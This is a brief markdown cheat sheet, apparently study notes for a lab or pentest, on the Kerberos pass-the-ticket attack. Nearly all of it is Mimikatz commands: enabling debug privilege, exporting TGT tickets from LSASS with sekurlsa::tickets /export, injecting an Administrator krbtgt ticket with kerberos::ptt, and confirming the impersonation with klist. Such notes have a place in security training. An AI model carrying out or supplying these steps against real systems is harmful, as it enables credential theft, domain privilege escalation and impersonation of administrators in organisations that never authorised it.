# Pass The Ticket Attack

### How it works
1) Mimikatz dumps the TGT from LSASS (it will return a kirbi ticket)
2) Pass the ticket and acts as it's original owner

## Dump the ticket
```cmd
mimikatz.exe
privilege::debug
```

Ensure this output is '20'OK
If it doesn't, it means that you don't have admin privileges

```cmd
sekurlsa::tickets /export
```

This will export the ticket (.kirbi) to the directory you're in


## Pass the ticket
If you leave mimikatz, you will see that there are tickets in the directory. 
Copy the one that is interesting for you and return to mimiktatz

```cmd 
mimikatz.exe
```

This will cache the ticket and impersonate it

```cmd
kerberos::ptt [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

- The ticket looks like (it's the name of the file): `[0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
- The output should be `* File : <Stuff> OK`

## List cached tickets
We are just verifying that we successfully impersonated the ticket by listing our cached tickets. 
```cmd
klist
```
